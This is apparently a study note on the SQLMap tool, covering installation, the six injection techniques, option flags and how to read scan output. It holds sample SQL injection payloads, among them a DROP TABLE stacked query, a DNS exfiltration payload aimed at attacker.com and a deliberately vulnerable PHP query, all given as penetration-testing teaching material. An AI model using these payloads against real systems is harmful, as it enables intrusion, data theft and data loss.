# SQLMap 

Open-source Python tool that automates detecting and exploiting SQL injection. Been around since 2006, still actively maintained.

## Installation

```bash
# Debian/Ubuntu
sudo apt install sqlmap

# Manual (latest from GitHub)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```


## Basic Usage

```bash
python sqlmap.py -u 'http://target.com/page.php?id=5'
```

It'll automatically test the parameter, check for WAF/IPS, and attempt injection.

## What It Can Do

- Detect & exploit SQLi vulnerabilities
- Fingerprint the database
- Enumerate data (tables, columns, dumps)
- Bypass WAF/IPS using tamper scripts
- Access the file system
- Execute OS commands (on supported DBMSes)

## Supported Databases

Supports pretty much everything — MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB, IBM DB2, Firebird, and 30+ more. Broadest DBMS support of any SQLi tool.

## SQL Injection Types (BEUSTQ)

Run `sqlmap -hh` to see technique flags. Default uses all: `--technique=BEUSTQ`

### B – Boolean-based Blind

```sql
AND 1=1
```

- Compares TRUE vs FALSE responses (content, HTTP codes, page titles, etc.)
- TRUE = response looks normal
- FALSE = response looks different
- Slow — needs ~7–8 requests per character
- Most common SQLi type in the wild

### E – Error-based

```sql
AND GTID_SUBSET(@@version,0)
```

- Works when DBMS errors are returned in the response
- SQLMap uses known payloads that trigger specific DBMS misbehaviors
- Retrieves data in ~200 byte chunks per request
- Faster than blind methods, second only to UNION-based
- Supported on: MySQL, PostgreSQL, Oracle, MSSQL, Sybase, DB2, and more

### U – UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```

- Fastest type
- Extends the original query to return injected results directly in the page
- Best case: dump an entire table in a single request

### S – Stacked Queries

```sql
; DROP TABLE users
```

- Runs additional SQL statements after the vulnerable one ("piggy-backing")
- Needed for non-query statements like INSERT, UPDATE, DELETE
- Not all platforms support it — MSSQL and PostgreSQL do by default
- Useful for advanced stuff like OS command execution

### T – Time-based Blind

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

- Like Boolean-based, but uses response _time_ instead of content differences
- TRUE = noticeable delay
- FALSE = normal response time
- Considerably slower than Boolean-based
- Used when Boolean-based won't work (e.g., vulnerable statement is INSERT/UPDATE/DELETE with no visible page effect)

### Q – Inline Queries

```sql
SELECT (SELECT @@version) from
```

- Embeds a query inside the original query
- Uncommon — depends on how the web app is written
- SQLMap supports it anyway

### Out-of-band (not in BEUSTQ, but supported)

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

- Most advanced type
- Used when everything else is unsupported or too slow
- Works via DNS exfiltration — forces the server to make DNS requests to an attacker-controlled domain
- The SQL response gets embedded in the subdomain (e.g., `<sql_result>.attacker.com`)
- SQLMap collects the DNS errors and reconstructs the response

# SQLMap – Getting Started

## Help Flags

```bash
sqlmap -h    # basic options (enough for most cases)
sqlmap -hh   # full advanced options list
```

##  Options (from -hh)

**Target:**

```bash
-u URL          # target URL
-d              # direct DB connection string
-l LOGFILE      # parse targets from Burp/WebScarab proxy log
-m BULKFILE     # scan multiple targets from a text file
-r REQUESTFILE  # load full HTTP request from a file (super useful)
-g GOOGLEDORK   # use Google dork results as targets
-c CONFIGFILE   # load options from INI config file
```

**Request:**

```bash
-A              # custom User-Agent
-H              # extra header (e.g. "X-Forwarded-For: 127.0.0.1")
--method        # force HTTP method (e.g. PUT)
--data          # POST data string (e.g. "id=1")
--cookie        # set cookies (e.g. "PHPSESSID=abc123")
```

## Basic Scenario

Typical setup: web page takes a GET parameter like `?id=1`, passes it directly into SQL query with no sanitization.

Vulnerable PHP code looks like:

```php
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
```

If error reporting is on, the DB error shows in the response — makes detection obvious even manually.

## Running SQLMap

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

- `-u` → target URL
- `--batch` → skip all prompts, use defaults automatically (great for non-interactive runs)

## SQLMap Does Automatically

1. Tests if the target URL content is stable
2. Checks if the parameter is dynamic
3. Runs heuristic test to guess DBMS (e.g., MySQL)
4. Tests all applicable injection types for that DBMS
5. Reports vulnerable injection points with full payloads

## Sample Output – What a Confirmed Vuln Looks Like

SQLMap found 4 injection types on `id` parameter in one run:

```
Parameter: id (GET)

  Type: boolean-based blind
  Payload: id=1 AND 8814=8814

  Type: error-based
  Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*), ...FLOOR(RAND(0)*2))...)

  Type: time-based blind
  Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

  Type: UNION query
  Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(...)-- -
```

Results are saved to: `~/.sqlmap/output/<target>/`

## Notes

- SQLMap also picks up XSS during heuristic tests (bonus, but not its main job)
- When it detects the DBMS early, it skips irrelevant payloads for other DBMSes to save time
- 46 HTTP requests was enough to fully confirm and identify all injection types in the example above

# Reading the Output

Understanding what SQLMap is telling you during a scan matters — it shows what's being tested, what's confirmed, and what to report.

## Log Messages 

### "target URL content is stable"

Responses are consistent across identical requests. Good — makes it easier to spot differences caused by injection attempts. SQLMap can handle unstable targets too, but stability = cleaner results.

### "GET parameter 'id' appears to be dynamic"

The parameter actually affects the response when its value changes. This is what you want — means it's probably tied to a database query. If it's static, the parameter might not be processed at all.

### "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

SQLMap sent a broken/invalid value (like `?id=1",)..))'`) and got a MySQL error back. Not proof of SQLi yet — just a strong hint. Tells you the DBMS too.

### "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to XSS attacks"

Bonus find. Not SQLMap's main job but it runs a quick XSS heuristic anyway. Useful in large scans where you're testing many parameters.

### "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?"

Once the DBMS is identified, SQLMap offers to skip irrelevant payloads and focus only on MySQL-specific ones. Say yes — saves time.

### "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?"

Offer to run _all_ MySQL payloads, not just the top ones. Useful if you want thorough coverage. Only triggered when DBMS is confirmed.

### "reflective value(s) found and filtering out"

Parts of the injected payload are showing up in the response (reflected). This is noise that could confuse automation. SQLMap filters it out automatically before comparing responses — just a heads up, not an error.

### "GET parameter 'id' appears to be 'AND boolean-based blind' injectable (with --string="luther")"

Parameter looks injectable. Two things to note:

- Still might be a false positive — SQLMap runs logic checks at the end to eliminate those
- `--string="luther"` means SQLMap found a constant string in responses it can use to tell TRUE from FALSE — no need for fuzzy comparison, which means this result is more reliable

### "time-based comparison requires a larger statistical model, please wait..."

For time-based blind SQLi, SQLMap needs to collect enough normal response times first to build a baseline. That way it can detect deliberate delays even on slow/high-latency networks.

### "automatically extending ranges for UNION query injection technique tests..."

UNION-based checks need more requests than other types. To save time, SQLMap caps UNION tests at 10 requests by default. But if another injection type is already confirmed, it extends that cap — higher chance of success makes it worth the extra requests.

### "'ORDER BY' technique appears to be usable..."

Before sending actual UNION payloads, SQLMap tests if ORDER BY works. If yes, it can use binary search to quickly find the right number of columns needed for the UNION query — faster than brute-forcing column counts.

### "GET parameter 'id' is vulnerable. Do you want to keep testing the others?"

The big one. Confirmed vulnerability. You can stop here (default) or keep going to find all injectable parameters. Useful if you're doing a full app audit and want to report everything.

### "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Final summary — lists all confirmed injection points with type, title, and exact payloads. SQLMap only lists things it can actually exploit, not guesses.

### "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

All logs, session data, and output stored here. On future runs against the same target, SQLMap reuses this session data to minimize requests. Don't delete this folder if you're planning follow-up runs.
